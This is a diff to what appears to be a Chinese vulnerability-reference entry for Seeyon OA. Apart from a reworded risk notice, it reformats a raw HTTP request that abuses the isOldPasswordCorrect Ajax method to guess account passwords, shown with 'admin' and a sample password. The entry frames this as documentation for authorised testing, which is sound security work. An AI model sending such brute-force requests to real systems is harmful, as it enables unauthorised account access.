@@ -39,7 +39,7 @@ schema_version: "1"
 
 ## 操作风险
 
-请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -59,25 +59,25 @@ schema_version: "1"
 POST穷举用户和密码代码如下
 
 ```http
-    GET /seeyon/getAjaxDataServlet?S=ajaxOrgManager&M=isOldPasswordCorrect&CL=true&RVT=XML&P_1_String=admin&P_2_String=wy123456 HTTP/1.0
+GET /seeyon/getAjaxDataServlet?S=ajaxOrgManager&M=isOldPasswordCorrect&CL=true&RVT=XML&P_1_String=admin&P_2_String=wy123456 HTTP/1.0
 
-    Accept: */*
+Accept: */*
 
-    Accept-Language: zh-cn
+Accept-Language: zh-cn
 
-    Referer: http://www.0-sec.org/seeyon/individualManager.do?method=managerFrame
+Referer: http://www.0-sec.org/seeyon/individualManager.do?method=managerFrame
 
-    requesttype: AJAX
+requesttype: AJAX
 
-    Content-Type: application/x-www-form-urlencoded
+Content-Type: application/x-www-form-urlencoded
 
-    Cookie: 
+Cookie: 
 
-    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
 
-    Host: www.0-sec.org
+Host: www.0-sec.org
 
-    DNT: 1
+DNT: 1
 
-    Proxy-Connection: Keep-Alive
+Proxy-Connection: Keep-Alive
 ```
